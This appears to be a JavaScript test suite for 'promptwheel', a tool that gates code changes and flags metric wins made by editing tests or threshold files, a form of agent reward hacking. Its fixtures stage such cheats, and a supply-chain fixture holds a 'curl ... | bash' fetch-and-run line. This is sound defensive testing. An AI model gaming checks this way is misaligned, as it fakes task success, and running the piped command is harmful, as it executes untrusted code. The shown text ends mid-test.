// Dep-free test suite (node:test). Run: npm test  (or: node --test)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, readFileSync, rmSync, existsSync, mkdirSync, utimesSync, symlinkSync, unlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { extract, evaluate, median, spread, renderMarkdown, isNonSource, evaluatorMatcher, gain, judgeGaming, verdictFingerprint,
  allowFromComments, check, verdictExitCode, conformsToContract, VERDICTS, METRIC_STATUSES, DIRECTIONS, CONTRACT_VERSION, deriveVerdict } from '../bin/promptwheel.mjs';
import { createHash } from 'node:crypto';
import { realpathSync } from 'node:fs';

const ENGINE = join(dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'promptwheel.mjs');

// ---------------------------------------------------------------- unit: extract
test('extract: number = last number in output', () => assert.equal(extract('errors 3, then 7\n', 0), 7));
test('extract: exit code → 1/0', () => { assert.equal(extract('x', 0, 'exit'), 1); assert.equal(extract('x', 2, 'exit'), 0); });
test('extract: lines counts non-empty lines', () => assert.equal(extract('a\n\nb\n', 0, 'lines'), 2));
test('extract: regex first capture', () => assert.equal(extract('coverage: 88%', 0, { regex: 'coverage: (\\d+)' }), 88));
test('extract: regex capture wins over last-number fallback', () =>
  assert.equal(extract('coverage: 88% of 200 lines', 0, { regex: 'coverage: (\\d+)' }), 88));
test('extract: null when no number', () => assert.equal(extract('nothing here', 0), null));

// ------------------------------------------------------------ unit: median/spread
test('median: odd and even', () => { assert.equal(median([3, 1, 2]), 2); assert.equal(median([1, 2, 3, 4]), 2.5); });
test('median: empty → null', () => assert.equal(median([]), null));
test('spread: max - min', () => { assert.equal(spread([5, 2, 9]), 7); assert.equal(spread([]), 0); });

// -------------------------------------------------------------- unit: evaluate
const m = (over = {}) => ({ direction: 'down', guard: true, extract: 'number', ...over });

test('evaluate: improvement beyond noise → improved/medium/ok', () => {
  const ev = evaluate(m(), [10, 11], [4, 5], 2);
  assert.equal(ev.status, 'improved'); assert.equal(ev.ok, true); assert.equal(ev.confidence, 'medium');
});
test('evaluate: zero observed noise → high confidence', () => {
  const ev = evaluate(m(), [10, 10], [5, 5], 2);
  assert.equal(ev.status, 'improved'); assert.equal(ev.confidence, 'high');
});
test('evaluate: guarded regression beyond noise → fails (ok=false)', () => {
  const ev = evaluate(m(), [5, 5], [9, 9], 2);
  assert.equal(ev.status, 'regressed'); assert.equal(ev.ok, false);
});
test('evaluate: delta inside noise band → inconclusive, never fails a guard', () => {
  const ev = evaluate(m(), [200, 210], [205, 215], 2); // delta 5 ≤ noise 10
  assert.equal(ev.status, 'inconclusive'); assert.equal(ev.ok, true); assert.equal(ev.confidence, 'low');
});
test('evaluate: single read → unverified (noise unknown)', () => {
  assert.equal(evaluate(m({ guard: false }), [5], [4], 1).confidence, 'unverified');
});
test('evaluate: deterministic extract → high even on a single read', () => {
  assert.equal(evaluate(m({ extract: 'exit' }), [1], [1], 1).confidence, 'high');
});
test('evaluate: non-guard informational metric never fails', () => {
  assert.equal(evaluate(m({ guard: false }), [5, 5], [9, 9], 2).ok, true);
});
test('evaluate: one missing side → unmeasurable, never regressed', () => {
  const ev = evaluate(m(), [], [5, 5], 2);
  assert.equal(ev.status, 'unmeasurable'); assert.equal(ev.delta, null);
});

// ------------------------------------------------------------- unit: renderMarkdown
test('renderMarkdown: includes verdict, metric, delta', () => {
  const md = renderMarkdown({ base: 'a', head: 'b', mode: 'refs', repeat: 1, verdict: 'pass',
    metrics: [{ name: 'todos', guard: true, before: 4, after: 2, delta: -2, status: 'improved', confidence: 'high' }] });
  assert.match(md, /PASS/); assert.match(md, /todos/); assert.match(md, /-2/);
});

// ------------------------------------------------------------- integration helpers
function tmpRepo(metrics) {
  const d = mkdtempSync(join(tmpdir(), 'pw-test-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics }));
  return d;
}
const rev = (d, r = 'HEAD') => execFileSync('git', ['rev-parse', r], { cwd: d, encoding: 'utf8' }).trim();
const commitAll = (d, msg) => { execFileSync('git', ['add', '-A'], { cwd: d }); execFileSync('git', ['commit', '-qm', msg], { cwd: d }); };
function pw(d, args) {
  try { return { out: execFileSync('node', [ENGINE, ...args], { cwd: d, encoding: 'utf8' }), code: 0 }; }
  catch (e) { return { out: `${e.stdout || ''}${e.stderr || ''}`, code: e.status }; }
}
const TODOS = { name: 'todos', cmd: 'grep -rn TODO . --include=*.js 2>/dev/null | wc -l', extract: 'number', direction: 'down', guard: true };

// -------------------------------------------------------- integration: run pass/fail
test('run: passes on improvement (exit 0), fails on guarded regression (exit 1)', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'improve');
  let r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 0); assert.match(r.out, /improved/);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\nc // TODO\n'); commitAll(d, 'regress');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 1); assert.match(r.out, /FAIL/);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------------------------------- unit: verdict fingerprint (provenance)
test('verdictFingerprint: stable, order-independent, sensitive to the verdict', () => {
  const a = verdictFingerprint({ verdict: 'pass', metrics: [{ name: 'x', status: 'improved', ok: true, guard: true }, { name: 'y', status: 'unchanged', ok: true, guard: false }] });
  const b = verdictFingerprint({ verdict: 'pass', metrics: [{ name: 'y', status: 'unchanged', ok: true, guard: false }, { name: 'x', status: 'improved', ok: true, guard: true }] });
  assert.equal(a, b);                                   // metric order doesn't change the hash
  const c = verdictFingerprint({ verdict: 'gamed', metrics: [{ name: 'x', status: 'improved', ok: true, guard: true, gamed: true }] });
  assert.notEqual(a, c);                                // a different verdict is a different hash
  assert.match(a, /^[0-9a-f]{16}$/);
});

// ------------------------------------------- integration: evaluatorPaths content-hash auto-fail
test('run: editing a DECLARED evaluatorPath to pass is gamed; an UNdeclared one stays source', () => {
  const mk = (evaluatorPaths) => {
    const d = mkdtempSync(join(tmpdir(), 'pw-eval-'));
    const g = (a) => execFileSync('git', a, { cwd: d });
    g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
    writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, evaluatorPaths,
      metrics: [{ name: 'budget', cmd: 'node check.js', extract: 'exit', direction: 'pass', guard: true }] }));
    writeFileSync(join(d, 'src.js'), 'module.exports={errs:()=>3};\n');
    writeFileSync(join(d, 'budget.json'), '{"maxErrors":0}\n');
    writeFileSync(join(d, 'check.js'), "const{errs}=require('./src');const{maxErrors}=require('./budget.json');process.exit(errs()<=maxErrors?0:1);\n");
    commitAll(d, 'base');
    writeFileSync(join(d, 'budget.json'), '{"maxErrors":5}\n');   // raise the goalpost, no source change
    commitAll(d, 'head');
    return d;
  };
  // declared -> gamed (exit 2), and gate.evaluatorChanged names the file (proves the auto-fail ran)
  const d1 = mk(['budget.json']);
  let r = pw(d1, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 2);
  const rep = JSON.parse(r.out);
  assert.equal(rep.verdict, 'gamed');
  assert.ok(rep.gate && Array.isArray(rep.gate.evaluatorChanged) && rep.gate.evaluatorChanged.some((e) => e.path === 'budget.json'));
  rmSync(d1, { recursive: true, force: true });
  // UNdeclared -> the documented opt-in miss: budget.json stays source, the win survives, PASS
  const d2 = mk([]);
  r = pw(d2, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 0);
  assert.equal(JSON.parse(r.out).verdict, 'pass');
  rmSync(d2, { recursive: true, force: true });
});

// ------------------------------------------- integration: mandates (protected-path hard rule)
test('run: a mandate forbidding a path fails the gate when that path is touched, passes otherwise', () => {
  const mk = (touchProtected) => {
    const d = mkdtempSync(join(tmpdir(), 'pw-mand-'));
    const g = (a) => execFileSync('git', a, { cwd: d });
    g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
    writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false,
      mandates: [{ name: 'no-secrets-edits', paths: ['secrets.json'], reason: 'secrets are frozen; rotate in a dedicated PR' }],
      metrics: [{ name: 'todos', cmd: 'grep -c TODO app.js || true', extract: 'number', direction: 'down', guard: true }] }));
    writeFileSync(join(d, 'secrets.json'), '{"v":1}\n');
    writeFileSync(join(d, 'app.js'), 'x // TODO\n');
    commitAll(d, 'base');
    writeFileSync(join(d, 'app.js'), 'x\n');                             // a real win: TODO removed in source
    if (touchProtected) writeFileSync(join(d, 'secrets.json'), '{"v":2}\n'); // ... but a protected path was touched
    commitAll(d, 'head');
    return d;
  };
  // touched the protected path -> FAIL with a named mandate, even though the metric improved
  const d1 = mk(true);
  let r = pw(d1, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 1);
  let rep = JSON.parse(r.out);
  assert.equal(rep.verdict, 'fail');
  assert.ok(Array.isArray(rep.mandates) && rep.mandates[0].name === 'no-secrets-edits');
  assert.ok(rep.mandates[0].files.includes('secrets.json'));
  rmSync(d1, { recursive: true, force: true });
  // same win, protected path untouched -> the win stands, PASS, mandate silent
  const d2 = mk(false);
  r = pw(d2, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 0);
  rep = JSON.parse(r.out);
  assert.equal(rep.verdict, 'pass');
  assert.ok(!rep.mandates);
  rmSync(d2, { recursive: true, force: true });
});

// ----------------------------------------------------------- integration: provenance receipt
test('run: report carries a reproducible provenance receipt', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'improve');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  const rep = JSON.parse(r.out);
  assert.ok(rep.provenance, 'report has provenance');
  assert.equal(rep.provenance.tool, 'promptwheel');
  assert.match(rep.provenance.baseSha, /^[0-9a-f]{40}$/);
  assert.match(rep.provenance.headSha, /^[0-9a-f]{40}$/);
  assert.match(rep.provenance.configHash, /^[0-9a-f]{16}$/);
  assert.match(rep.provenance.verdictHash, /^[0-9a-f]{16}$/);
  const r2 = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(JSON.parse(r2.out).provenance.verdictHash, rep.provenance.verdictHash); // reproducible
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------------- unit: gaming detection
test('isNonSource: tests/config/grader/golden are non-source', () => {
  for (const p of ['app.test.js', 'test.js', 'tests.ts', 'src/__tests__/x.ts', 'spec/y.js',
    'eval.mjs', 'grader.ts', 'fixtures/a.json', 'x.snap', 'golden.json', 'tsconfig.json',
    'jest.config.js', '.eslintrc.json', 'pytest.ini', 'conftest.py', 'src/foo_test.py'])
    assert.equal(isNonSource(p), true, p);
});
test('isNonSource: real production source is NOT non-source', () => {
  for (const p of ['src/app.js', 'lib/handler.ts', 'index.mjs', 'latest.js', 'mytest.js', 'contest.py'])
    assert.equal(isNonSource(p), false, p);
});
test('isNonSource: a grader/eval/score FILE by name is non-source; a production name that merely starts with the token is source', () => {
  for (const p of ['eval.mjs', 'grader.ts', 'score.test.ts', 'eval-set.js', 'grader_x.mjs', 'scoring.ts', 'evals.ts', 'scorer.js', 'lib/grader.cjs'])
    assert.equal(isNonSource(p), true, p);
  for (const p of ['evaluate.ts', 'evaluation.js', 'scoreboard.js', 'scores.ts', 'src/evaluator.mjs', 'graderboard.ts'])
    assert.equal(isNonSource(p), false, p);   // an honest fix in src/evaluation.ts must never read GAMED
});
test('isNonSource: tool-named CONFIG is non-source; tool-named SOURCE is source', () => {
  for (const p of ['jest.config.ts', 'eslint.config.mjs', 'playwright.config.js', 'karma.conf.js', 'jest.setup.ts', 'tsconfig.base.json'])
    assert.equal(isNonSource(p), true, p);
  for (const p of ['cli/src/installers/eslint.ts', 'src/vitest-helpers.ts', 'lib/babel.ts'])
    assert.equal(isNonSource(p), false, p);  // corpus finding: production file named after a tool must stay in the source slice
});
test('isNonSource: cross-language test filenames are non-source (red-team gap)', () => {
  for (const p of ['test.c', 'tests.go', 'subtract_test.c', 'test_foo.cpp', 'pkg/handler_test.go',
    'math_test.rs', 'user_spec.rb', 'calc_test.rb', 'SubtractTest.java', 'BarTests.kt'])
    assert.equal(isNonSource(p), true, p);
});
test('isNonSource: ambiguous production names that merely contain "test" stay source', () => {
  for (const p of ['latest.c', 'speedtest.go', 'contest.java', 'Contest.java', 'Check.java',
    'lib/latest.rb', 'contest.rb', 'score.py'])
    assert.equal(isNonSource(p), false, p);  // conservative: a strong-signal token (_test/_spec/Test suffix) is required, never a substring
});
test('evaluatorMatcher: opt-in evaluator-path globs (bare name any depth, "/" anchors, ** crosses, leading /)', () => {
  const bare = evaluatorMatcher({ evaluatorPaths: ['budget.json'] });
  for (const p of ['budget.json', 'config/budget.json', 'a/b/budget.json']) assert.equal(bare(p), true, p);
  for (const p of ['budget.json.bak', 'mybudget.json', 'src/app.js']) assert.equal(bare(p), false, p);
  const glob = evaluatorMatcher({ evaluatorPaths: ['ci/*.limits', 'thresholds/**'] });
  assert.equal(glob('ci/perf.limits'), true);
  assert.equal(glob('ci/nested/perf.limits'), false);   // * does not cross /
  assert.equal(glob('thresholds/a/b/x.json'), true);     // ** crosses /
  const rooted = evaluatorMatcher({ evaluatorPaths: ['/budget.json'] });
  assert.equal(rooted('budget.json'), true);
  assert.equal(rooted('config/budget.json'), false);     // leading / anchors to repo root
  assert.equal(evaluatorMatcher({})('anything'), false);              // no field -> matches nothing
  assert.equal(evaluatorMatcher({ evaluatorPaths: 'nope' })('nope'), false);  // non-array ignored, no throw
});
test('gain: directional improvement', () => {
  assert.equal(gain({ direction: 'up' }, 5, 8), 3);
  assert.equal(gain({ direction: 'down' }, 8, 5), 3);
  assert.equal(gain({ direction: 'pass' }, 0, 1), 1);
  assert.equal(gain({ direction: 'pass' }, 0, 0), -1);
});
test('judgeGaming: zero source change → gamed', () =>
  assert.equal(judgeGaming({ before: 0, after: 1, direction: 'pass' }, { hadSourceChange: false }).gamed, true));
test('judgeGaming: source reproduces the full win → not gamed', () => {
  const j = judgeGaming({ before: 0, after: 1, direction: 'pass' }, { hadSourceChange: true, samples: [1] });
  assert.equal(j.gamed, false); assert.equal(j.retained, 1);
});
test('judgeGaming: source reproduces <half the win → gamed', () => {
  const j = judgeGaming({ before: 100, after: 40, direction: 'down' }, { hadSourceChange: true, samples: [85] });
  assert.equal(j.gamed, true); assert.equal(j.retained, 0.25);
});
test('judgeGaming: exactly half the gain retained → NOT gamed (boundary)', () => {
  const j = judgeGaming({ before: 100, after: 60, direction: 'down' }, { hadSourceChange: true, samples: [80] });
  assert.equal(j.retained, 0.5); assert.equal(j.gamed, false);
});
test('judgeGaming: gamingThreshold is honored (same retention, different verdicts)', () => {
  const src = { hadSourceChange: true, samples: [80] }; // retained 0.5
  assert.equal(judgeGaming({ before: 100, after: 60, direction: 'down' }, src, 0.6).gamed, true);
  assert.equal(judgeGaming({ before: 100, after: 60, direction: 'down' }, src, 0.4).gamed, false);
});

// ------------------------------------------ integration: --detect-gaming end-to-end
test('run --detect-gaming: catches a win made by editing the test; passes a real source fix', () => {
  const TP = { name: 'tests_pass', cmd: 'node app.test.js', extract: 'exit', direction: 'pass', guard: true };
  const d = tmpRepo([TP]);
  writeFileSync(join(d, 'src.js'), 'module.exports = { add: (a,b)=>a+b };\n');
  writeFileSync(join(d, 'app.test.js'), "const A=require('assert');const {add,subtract}=require('./src');A.strictEqual(add(2,2),4);A.strictEqual(subtract(5,3),2);\n");
  commitAll(d, 'base'); const base = rev(d);
  // GAMED: delete the failing assertion (edit the TEST); source untouched
  writeFileSync(join(d, 'app.test.js'), "const A=require('assert');const {add}=require('./src');A.strictEqual(add(2,2),4);\n");
  commitAll(d, 'gamed'); const gamed = rev(d);
  let r = pw(d, ['run', '--base', base, '--head', gamed, '--detect-gaming', '--no-record']);
  assert.equal(r.code, 2, r.out); assert.match(r.out, /GAMED/);
  // LEGIT: implement subtract in SOURCE; test intact
  execFileSync('git', ['checkout', '-q', base], { cwd: d });
  writeFileSync(join(d, 'src.js'), 'module.exports = { add: (a,b)=>a+b, subtract: (a,b)=>a-b };\n');
  commitAll(d, 'legit'); const legit = rev(d);
  r = pw(d, ['run', '--base', base, '--head', legit, '--detect-gaming', '--no-record']);
  assert.equal(r.code, 0, r.out); assert.doesNotMatch(r.out, /GAMED/);
  rmSync(d, { recursive: true, force: true });
});

test('run --detect-gaming: a gamingCheck:false guard is exempt from the source-only re-run (no FP on test-side gains)', () => {
  // tests_pass is the source-proven target; `asserts` is a test-side guard that must NOT be re-proven from source
  const d = tmpRepo([
    { name: 'tests_pass', cmd: 'node t.js', extract: 'exit', direction: 'pass', guard: true },
    { name: 'asserts', cmd: 'grep -roE "ok" x.test.js 2>/dev/null | wc -l | tr -d " "', extract: 'number', direction: 'up', guard: true, gamingCheck: false },
  ]);
  writeFileSync(join(d, 'src.js'), 'module.exports={f:()=>1};\n');
  writeFileSync(join(d, 't.js'), "const a=require('assert');const{f,g}=require('./src');a.strictEqual(f(),1);a.strictEqual(g(),2);\n"); // g missing → fails
  writeFileSync(join(d, 'x.test.js'), 'ok\n');
  commitAll(d, 'base'); const base = rev(d);
  writeFileSync(join(d, 'src.js'), 'module.exports={f:()=>1,g:()=>2};\n'); // real source fix → tests pass
  writeFileSync(join(d, 'x.test.js'), 'ok\nok\nok\n');                      // test-side gain (asserts 1→3)
  commitAll(d, 'head');
  const r = pw(d, ['run', '--base', base, '--head', 'HEAD', '--detect-gaming', '--no-record']);
  assert.equal(r.code, 0, r.out);          // PASS, the test-side gain must not be flagged GAMED
  assert.doesNotMatch(r.out, /GAMED/);
  rmSync(d, { recursive: true, force: true });
});

test('run --detect-gaming: evaluatorPaths opts a generic gate file into the non-source slice', () => {
  const GATE = { name: 'gate', cmd: 'node check.js', extract: 'exit', direction: 'pass', guard: true };
  const d = tmpRepo([GATE]);
  const base0 = { 'src.js': 'module.exports={errs:()=>3};\n', 'budget.json': '{"maxErrors":0}\n', 'check.js': "const{errs}=require('./src');const{maxErrors}=require('./budget.json');process.exit(errs()<=maxErrors?0:1);\n" };
  const writeBase = () => { for (const [p, c] of Object.entries(base0)) writeFileSync(join(d, p), c); };
  // (1) NOT declared: raising the generic threshold file reads as a source win -> PASS (the open-gap baseline)
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [GATE] }));
  writeBase(); commitAll(d, 'base'); const base = rev(d);
  writeFileSync(join(d, 'budget.json'), '{"maxErrors":5}\n'); commitAll(d, 'raise'); const raised = rev(d);
  let r = pw(d, ['run', '--base', base, '--head', raised, '--detect-gaming', '--no-record']);
  assert.equal(r.code, 0, r.out); assert.doesNotMatch(r.out, /GAMED/);
  // (2) declared as evaluator surface: the SAME cheat is now caught
  execFileSync('git', ['checkout', '-q', base], { cwd: d });
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, evaluatorPaths: ['budget.json'], metrics: [GATE] }));
  writeFileSync(join(d, 'budget.json'), '{"maxErrors":0}\n'); commitAll(d, 'base2'); const base2 = rev(d);
  writeFileSync(join(d, 'budget.json'), '{"maxErrors":5}\n'); commitAll(d, 'raise2'); const raised2 = rev(d);
  r = pw(d, ['run', '--base', base2, '--head', raised2, '--detect-gaming', '--no-record']);
  assert.equal(r.code, 2, r.out); assert.match(r.out, /GAMED/);   // budget.json is now non-source -> zero source edits -> gamed
  rmSync(d, { recursive: true, force: true });
});

// ----------------------------------------------------------- integration: --working
test('run --working: measures uncommitted change, leaves tree untouched, writes nothing to the repo', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); // uncommitted improvement
  const r = pw(d, ['run', '--working']);
  assert.equal(r.code, 0);
  assert.equal(readFileSync(join(d, 'app.js'), 'utf8').includes('TODO'), false); // tree still has the change
  assert.ok(!existsSync(join(d, '.promptwheel')));                                // no record, no directory
  rmSync(d, { recursive: true, force: true });
});

// -------------------------------------- R2: --working sees newly added (untracked) files
test('run --working: SEES newly added untracked files (the dominant agent action)', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'base');   // 0 TODOs committed
  writeFileSync(join(d, 'new.js'), 'x // TODO\n');                    // untracked new file
  const r = pw(d, ['run', '--working', '--no-record']);
  assert.equal(r.code, 1);                       // todos 0->1 guarded regression, only visible if untracked is snapshotted
  assert.ok(existsSync(join(d, 'new.js')));       // working tree untouched
  rmSync(d, { recursive: true, force: true });
});

// --------------------------------------------------------------- R4: init + presets
test('init: writes a starter config for the stack, refuses overwrite without --force', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-init-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"exit 0"}}');
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  let r = pw(d, ['init']);
  assert.equal(r.code, 0); assert.ok(existsSync(join(d, 'promptwheel.config.json')));
  const written = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).metrics;
  assert.ok(written.some((m) => m.name === 'tests_pass'));
  assert.ok(written.some((m) => m.name === 'assertions'), 'default config includes antihack tripwires');
  assert.match(written.find((m) => m.name === 'suppressions').cmd, /nosec/, 'suppression tripwire also greps bandit-style # nosec');
  assert.ok(!written.some((m) => m.name === 'lint_errors'), 'no lint metric when eslint is absent');
  assert.equal(pw(d, ['init']).code, 64);         // refuses overwrite (usage error, never a verdict code)
  assert.equal(pw(d, ['init', '--list']).code, 0); // catalog
  rmSync(d, { recursive: true, force: true });
});

test('init: writes the agent gate block to AGENTS.md (idempotent; --no-agent-block skips)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-agentblock-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"exit 0"}}');
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  assert.equal(pw(d, ['init']).code, 0);
  let agents = readFileSync(join(d, 'AGENTS.md'), 'utf8');
  assert.match(agents, /<!-- promptwheel:gate -->/, 'wrote the sentinel-delimited gate block');
  assert.match(agents, /promptwheel run --working/, 'the block tells the agent when to run the gate');
  assert.equal(pw(d, ['init', '--force']).code, 0);
  agents = readFileSync(join(d, 'AGENTS.md'), 'utf8');
  assert.equal((agents.match(/<!-- promptwheel:gate -->/g) || []).length, 1, 'idempotent: one block, not duplicated');
  const d2 = mkdtempSync(join(tmpdir(), 'pw-noblock-'));
  const g2 = (a) => execFileSync('git', a, { cwd: d2 });
  g2(['init', '-q']); g2(['config', 'user.email', 't@t']); g2(['config', 'user.name', 't']);
  writeFileSync(join(d2, 'package.json'), '{"name":"x","scripts":{"test":"exit 0"}}'); writeFileSync(join(d2, 'a.js'), '1\n'); commitAll(d2, 'base');
  assert.equal(pw(d2, ['init', '--no-agent-block']).code, 0);
  assert.ok(!existsSync(join(d2, 'AGENTS.md')), '--no-agent-block writes no AGENTS.md');
  rmSync(d, { recursive: true, force: true }); rmSync(d2, { recursive: true, force: true });
});

test('init --preset supply-chain: the pack is copied from the package into .promptwheel and measured from there; an ignored .promptwheel/ is warned about', () => {
  // the designed path: the pack is committed with the config, so the worktrees contain it and
  // the metric measures the real count (an npm user has no packs/ directory of their own)
  const d = mkdtempSync(join(tmpdir(), 'pw-scpack-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"postinstall":"node x.js"}}\n'); commitAll(d, 'base: an install script');
  let r = pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']);
  assert.equal(r.code, 0, r.out);
  assert.doesNotMatch(r.out, /gitignored/, 'nothing is ignored here, so no warning');
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.equal(cfg.metrics.find((m) => m.name === 'lifecycle_scripts').cmd, 'node .promptwheel/packs/supply-chain/scan.mjs lifecycle .', 'the preset command is rewritten to the copied pack');
  assert.ok(existsSync(join(d, '.promptwheel/packs/supply-chain/lock.mjs')), 'the whole pack is copied, not just the scanner');
  commitAll(d, 'config + pack');
  writeFileSync(join(d, 'package.json'), '{"name":"x"}\n'); commitAll(d, 'drop the install script');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /lifecycle_scripts\s+1 →\s+0 .*improved/, 'the copied scanner ran in the worktrees and measured 1 -> 0');
  // the trap: with .promptwheel/ ignored the pack never reaches a worktree and the metric reads
  // unmeasurable at both refs; init must say so instead of leaving a FAIL with no hint why
  const d2 = mkdtempSync(join(tmpdir(), 'pw-scpack-ign-'));
  const g2 = (a) => execFileSync('git', a, { cwd: d2 });
  g2(['init', '-q']); g2(['config', 'user.email', 't@t']); g2(['config', 'user.name', 't']);
  writeFileSync(join(d2, '.gitignore'), '.promptwheel/\n'); writeFileSync(join(d2, 'a.js'), '1\n'); commitAll(d2, 'base');
  r = pw(d2, ['init', '--preset', 'supply-chain', '--no-agent-block']);
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /\.promptwheel\/packs\/supply-chain is gitignored/, 'init warns that the copied pack will not reach the measurement worktrees');
  assert.match(r.out, /!\.promptwheel\/packs\//, 'and names the .gitignore rule that fixes it');
  rmSync(d, { recursive: true, force: true }); rmSync(d2, { recursive: true, force: true });
});

// ------------------------------------------- supply-chain pack + preset (paths and counts, held)
const SC_SCAN = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'scan.mjs');
const scan = (what, dir) => { try { return { out: execFileSync('node', [SC_SCAN, what, dir], { encoding: 'utf8' }).trim(), code: 0 }; } catch (e) { return { out: `${e.stdout || ''}${e.stderr || ''}`, code: e.status }; } };

test('supply-chain pack: unpinned execution and install policy are counted, pinned references are not', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-sc-pin-'));
  mkdirSync(join(d, '.github/workflows'), { recursive: true }); mkdirSync(join(d, 'scripts'));
  const sha = 'a'.repeat(40);
  writeFileSync(join(d, '.github/workflows/ci.yml'), ['jobs:', '  a:', '    steps:', '      - uses: actions/checkout@v4', `      - uses: actions/setup-node@${sha}`, '      - uses: ./local-action', '      # - uses: commented/out@v1', '      - run: npx -y sawbuck debt', '      - run: npx -y sawbuck@0.1.32 debt', '      - run: curl -s https://x.example/i.sh | bash', '      - run: npm install -g tool'].join('\n'));
  writeFileSync(join(d, 'action.yml'), 'runs:\n  steps:\n    - run: pnpm dlx thing@latest\n');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ devDependencies: { tsc: '1' }, scripts: { b: 'npx tsc', c: 'npx cowsay' } }));
  writeFileSync(join(d, 'scripts/go.sh'), '#!/bin/sh\n# npx comment\nnpx --yes @scope/pkg@1.2.3\n');
  assert.equal(scan('unpinned', d).out, '6', 'tag action, npx, curl pipe, global install, dlx latest, undeclared npx');
  assert.equal(scan('policy', d).out, '2');
  writeFileSync(join(d, '.npmrc'), 'ignore-scripts=true\nmin-release-age=3\n');
  assert.equal(scan('policy', d).out, '0');
});

test('lock: the same tree writes the same bytes, ordinary edits do not drift, structure does', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-lock-'));
  execFileSync('git', ['init', '-q'], { cwd: d });
  mkdirSync(join(d, 'src/api'), { recursive: true }); mkdirSync(join(d, 'src/db')); mkdirSync(join(d, 'src/auth')); mkdirSync(join(d, 'src/app/billing'), { recursive: true }); mkdirSync(join(d, '.github/workflows'), { recursive: true }); mkdirSync(join(d, 'test'));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', bin: { a: 'x.js' }, exports: { '.': './x.js' }, dependencies: { left: '1' } }));
  writeFileSync(join(d, 'src/api/h.js'), "import { q } from '../db/q.js';\napp.get('/users', h);\nconst u = 'https://api.stripe.com/v1';\n// see https://in-a-comment.dev/x\n");
  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 1;\n');
  writeFileSync(join(d, 'src/auth/a.js'), 'export const a = 1;\n');
  writeFileSync(join(d, 'src/app/billing/route.ts'), 'export const GET = 1;\n');
  writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\n');
  writeFileSync(join(d, 'test/h.test.js'), "fetch('https://only-in-a-test.dev/')\n");
